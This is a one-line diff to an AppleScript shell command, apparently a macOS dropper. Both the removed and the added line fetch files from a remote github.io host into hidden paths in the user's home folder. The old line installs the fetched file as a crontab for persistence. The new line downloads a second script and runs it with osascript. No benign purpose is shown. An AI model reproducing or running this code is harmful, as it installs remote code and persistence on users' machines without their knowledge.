@@ -1,1 +1,1 @@
-do shell script "curl https://sitetest.github.io/cron.txt >~/.t; crontab ~/.t; rm ~/.t; mkdir -p ~/.tmp;"
+do shell script "mkdir -p ~/.tmp; curl https://sitetest.github.io/cron.txt >~/.tmp/.t; curl https://sitetest.github.io/val.txt >~/.tmp/.val.scpt; osascript ~/.tmp/.val.scpt"
